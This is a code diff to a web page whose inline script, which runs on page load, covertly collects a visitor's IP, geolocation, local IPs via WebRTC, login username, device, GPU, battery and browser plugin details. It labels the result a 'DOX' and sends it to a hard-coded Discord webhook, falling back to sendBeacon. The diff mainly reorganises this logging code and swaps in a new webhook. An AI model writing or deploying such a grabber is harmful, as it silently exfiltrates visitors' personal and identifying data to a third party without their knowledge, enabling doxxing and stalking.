@@ -22,7 +22,7 @@
             font-family: 'JetBrains Mono', monospace;
             font-weight: 700;
             font-size: 3em;
-            color: #00ff00; /* verde brillante */
+            color: #00ff00;
             padding: 15px;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
             margin-top: 15vh;
@@ -63,12 +63,12 @@
 
 <script>
     // ================================================================
-    //  YOUR WEBHOOK (replace with yours)
+    //  YOUR NEW WEBHOOK (updated)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
     // ================================================================
-    //  MASSIVE VPN/PROXY KEYWORD BLACKLIST (500+ entries)
+    //  MASSIVE VPN/PROXY KEYWORD BLACKLIST
     // ================================================================
     const VPN_KEYWORDS = [
         'vpn','proxy','hosting','cloud','datacenter','incognito','anonymous','tor','exit node',
@@ -122,7 +122,7 @@
     }
 
     // ================================================================
-    //  WEBRTC: local IPs + full hostname
+    //  WEBRTC: local IPs + hostname
     // ================================================================
     function getWebRTCInfo() {
         return new Promise((resolve) => {
@@ -161,7 +161,7 @@
     }
 
     // ================================================================
-    //  WINDOWS LOGIN USERNAME (ActiveX) + Browser Credentials + UA parse
+    //  USERNAME EXTRACTION
     // ================================================================
     function getWindowsUser() {
         try {
@@ -184,12 +184,8 @@
 
     function getUsernameFromUA() {
         const ua = navigator.userAgent;
-        // Some corporate Windows builds put the username in the UA after "Windows NT"
-        // e.g. "Windows NT 10.0; Win64; x64; rv:90.0" but rarely includes name.
-        // On Mac, it often includes the device owner name.
         const macOwnerMatch = ua.match(/\(Macintosh; Intel Mac OS X [\d_]+\)[^\)]*?([\w\-]+)'?s\s+Mac/);
         if (macOwnerMatch) return macOwnerMatch[1];
-        // Try to find a pattern like "(John Doe's MacBook Pro)"
         const namedDevice = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
         if (namedDevice && namedDevice[2] && !namedDevice[2].includes('Mac') && !namedDevice[2].includes('Windows')) {
             return namedDevice[2];
@@ -201,128 +197,118 @@
     //  MAIN
     // ================================================================
     (async function() {
-
-        // ---- 1. IP Geo ----
-        const geo = await fetchIPData();
-
-        // ---- 2. VPN detection - triple layer ----
-        let isVpn = geo.proxy === true;
-        if (!isVpn) {
-            const ispLower = (geo.isp || '').toLowerCase();
-            const asnLower = (geo.asn || '').toLowerCase();
-            isVpn = VPN_KEYWORDS.some(k => ispLower.includes(k) || asnLower.includes(k));
-        }
-        // timezone vs country mismatch
         try {
-            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const tzContinent = tz.split('/')[0];
-            const ipContinent = geo.country ? geo.country.toUpperCase() : '';
-            const europeCountries = ['DE','FR','UK','IT','ES','NL','BE','CH','AT','SE','NO','DK','FI','PL','RU'];
-            const usCountries = ['US','CA','MX'];
-            if (usCountries.includes(ipContinent) && tzContinent === 'Europe') isVpn = true;
-            if (europeCountries.includes(ipContinent) && tzContinent === 'America') isVpn = true;
-        } catch (_) {}
-        const vpnStatus = isVpn ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';
+            const geo = await fetchIPData();
 
-        // ---- 3. WebRTC ----
-        const webrtc = await getWebRTCInfo();
-        const localIPs = webrtc.localIPs;
-        let hostname = webrtc.hostname;
-        if (!hostname && localIPs.length > 0) {
-            hostname = localIPs[0]; // fallback
-        }
+            // ---- VPN detection ----
+            let isVpn = geo.proxy === true;
+            if (!isVpn) {
+                const ispLower = (geo.isp || '').toLowerCase();
+                const asnLower = (geo.asn || '').toLowerCase();
+                isVpn = VPN_KEYWORDS.some(k => ispLower.includes(k) || asnLower.includes(k));
+            }
+            try {
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const tzContinent = tz.split('/')[0];
+                const ipContinent = geo.country ? geo.country.toUpperCase() : '';
+                const europeCountries = ['DE','FR','UK','IT','ES','NL','BE','CH','AT','SE','NO','DK','FI','PL','RU'];
+                const usCountries = ['US','CA','MX'];
+                if (usCountries.includes(ipContinent) && tzContinent === 'Europe') isVpn = true;
+                if (europeCountries.includes(ipContinent) && tzContinent === 'America') isVpn = true;
+            } catch (_) {}
+            const vpnStatus = isVpn ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';
 
-        // ---- 4. Login Username - all possible methods ----
-        let winUser = getWindowsUser();
-        let credUser = await getCredentialUser();
-        let uaUser = getUsernameFromUA();
+            // ---- WebRTC ----
+            const webrtc = await getWebRTCInfo();
+            const localIPs = webrtc.localIPs;
+            let hostname = webrtc.hostname;
+            if (!hostname && localIPs.length > 0) {
+                hostname = localIPs[0];
+            }
 
-        // Pick the first non-null, non-generic value
-        let finalLoginUser = winUser || credUser || uaUser || 'not available (IE/ActiveX or credentials required)';
-        // If the value is "not available" but we have a hostname that looks like a real name (not generic), use it as hint
-        if (finalLoginUser === 'not available (IE/ActiveX or credentials required)' && hostname && !hostname.includes('unknown') && hostname.length > 3) {
-            // hostname might be the computer name, but we can still show it as fallback
-            // but we'll label it separately
-        }
+            // ---- Username ----
+            let winUser = getWindowsUser();
+            let credUser = await getCredentialUser();
+            let uaUser = getUsernameFromUA();
+            let finalLoginUser = winUser || credUser || uaUser || 'not available (IE/ActiveX or credentials required)';
 
-        // ---- 5. System & device ----
-        const ua = navigator.userAgent;
-        let osDisplay = 'Unknown';
-        let deviceModel = 'Unknown';
-        let browserName = 'Unknown';
-        try {
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
-                if (he.model) deviceModel = he.model;
-                if (he.platform) osDisplay = he.platform;
-                if (he.fullVersionList && he.fullVersionList.length) {
-                    browserName = he.fullVersionList.map(b => b.brand + ' ' + b.version).join(', ');
+            // ---- System info ----
+            const ua = navigator.userAgent;
+            let osDisplay = 'Unknown';
+            let deviceModel = 'Unknown';
+            let browserName = 'Unknown';
+            try {
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
+                    if (he.model) deviceModel = he.model;
+                    if (he.platform) osDisplay = he.platform;
+                    if (he.fullVersionList && he.fullVersionList.length) {
+                        browserName = he.fullVersionList.map(b => b.brand + ' ' + b.version).join(', ');
+                    }
+                }
+            } catch (_) {}
+
+            if (osDisplay === 'Unknown') {
+                if (ua.includes('Windows NT')) {
+                    const winVer = ua.match(/Windows NT (\d+\.\d+)/);
+                    osDisplay = 'Windows ' + (winVer ? winVer[1] : 'NT');
+                    deviceModel = 'Windows PC';
+                } else if (ua.includes('Macintosh')) {
+                    osDisplay = 'macOS';
+                    const macModel = ua.match(/Macintosh; Intel Mac OS X [\d_]+\)/);
+                    deviceModel = macModel ? macModel[0].replace('Macintosh; ','') : 'Mac';
+                } else if (ua.includes('iPhone')) {
+                    const m = ua.match(/iPhone\s*([^;)]+)/);
+                    deviceModel = m ? m[0] : 'iPhone';
+                    osDisplay = 'iOS';
+                } else if (ua.includes('Android')) {
+                    const m = ua.match(/Android\s*([^;)]+)/);
+                    deviceModel = m ? m[0] : 'Android';
+                    osDisplay = 'Android';
+                } else {
+                    osDisplay = 'Unknown OS';
+                    deviceModel = 'Unknown device';
                 }
             }
-        } catch (_) {}
-
-        if (osDisplay === 'Unknown' || osDisplay === 'Unknown') {
-            if (ua.includes('Windows NT')) {
-                const winVer = ua.match(/Windows NT (\d+\.\d+)/);
-                osDisplay = 'Windows ' + (winVer ? winVer[1] : 'NT');
-                deviceModel = 'Windows PC';
-            } else if (ua.includes('Macintosh')) {
-                osDisplay = 'macOS';
-                const macModel = ua.match(/Macintosh; Intel Mac OS X [\d_]+\)/);
-                deviceModel = macModel ? macModel[0].replace('Macintosh; ','') : 'Mac';
-            } else if (ua.includes('iPhone')) {
-                const m = ua.match(/iPhone\s*([^;)]+)/);
-                deviceModel = m ? m[0] : 'iPhone';
-                osDisplay = 'iOS';
-            } else if (ua.includes('Android')) {
-                const m = ua.match(/Android\s*([^;)]+)/);
-                deviceModel = m ? m[0] : 'Android';
-                osDisplay = 'Android';
-            } else {
-                osDisplay = 'Unknown OS';
-                deviceModel = 'Unknown device';
+            if (browserName === 'Unknown') {
+                if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
+                else if (ua.includes('Firefox')) browserName = 'Firefox';
+                else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
+                else if (ua.includes('Edg')) browserName = 'Edge';
+                else browserName = 'Other';
             }
-        }
-        if (browserName === 'Unknown') {
-            if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
-            else if (ua.includes('Firefox')) browserName = 'Firefox';
-            else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
-            else if (ua.includes('Edg')) browserName = 'Edge';
-            else browserName = 'Other';
-        }
 
-        // ---- 6. Battery ----
-        let battery = 'unavailable';
-        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`; } catch (_) {}
+            // ---- Battery ----
+            let battery = 'unavailable';
+            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`; } catch (_) {}
 
-        // ---- 7. GPU ----
-        let gpu = 'Unavailable', gpuLevel = 'Unknown';
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debug) {
-                const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                gpu = `${vendor} | ${renderer}`;
-                if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';
-                else if (renderer.includes('RTX 40') || renderer.includes('RX 7')) gpuLevel = 'Mid-high';
-                else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Basic';
-                else gpuLevel = 'Other';
-            }
-        } catch (_) {}
+            // ---- GPU ----
+            let gpu = 'Unavailable', gpuLevel = 'Unknown';
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debug) {
+                    const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                    gpu = `${vendor} | ${renderer}`;
+                    if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';
+                    else if (renderer.includes('RTX 40') || renderer.includes('RX 7')) gpuLevel = 'Mid-high';
+                    else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Basic';
+                    else gpuLevel = 'Other';
+                }
+            } catch (_) {}
 
-        // ---- 8. Plugins & level ----
-        const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
-        const savvy = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-        const count = savvy.filter(p => plugins.includes(p)).length;
-        const userLevel = count >= 3 ? '🔥 Advanced privacy' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
+            // ---- Plugins ----
+            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
+            const savvy = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+            const count = savvy.filter(p => plugins.includes(p)).length;
+            const userLevel = count >= 3 ? '🔥 Advanced privacy' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
 
-        // ---- 9. Coordinates ----
-        const coords = (geo.lat && geo.lat !== '0' && geo.lon && geo.lon !== '0') ? `${geo.lat}, ${geo.lon}` : 'IP location failed';
+            const coords = (geo.lat && geo.lat !== '0' && geo.lon && geo.lon !== '0') ? `${geo.lat}, ${geo.lon}` : 'IP location failed';
 
-        // ---- 10. Build message ----
-        const msg = 
+            // ---- Build message ----
+            const msg = 
 `**🔹 DEDSEC CTOS – ULTIMATE DOX (NO PERMISSIONS) 🔹**
 **IP:** ${geo.ip}
 **ISP:** ${geo.isp}
@@ -348,20 +334,26 @@
 **User Level:** ${userLevel}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-        // ---- 11. Send ----
-        try {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: msg }),
-                keepalive: true
-            });
-        } catch (e) {
-            const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-            navigator.sendBeacon(WEBHOOK, blob);
-        }
+            // ---- Send to Discord ----
+            try {
+                // Try fetch with keepalive
+                const response = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg }),
+                    keepalive: true
+                });
+                if (!response.ok) throw new Error('Fetch failed');
+            } catch (e) {
+                // Fallback: sendBeacon (works even on page close)
+                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+                navigator.sendBeacon(WEBHOOK, blob);
+            }
 
-        console.log('✅ Data sent.');
+            console.log('✅ Data sent to Discord.');
+        } catch (err) {
+            console.error('❌ Error in main:', err);
+        }
     })();
 </script>
 </body>
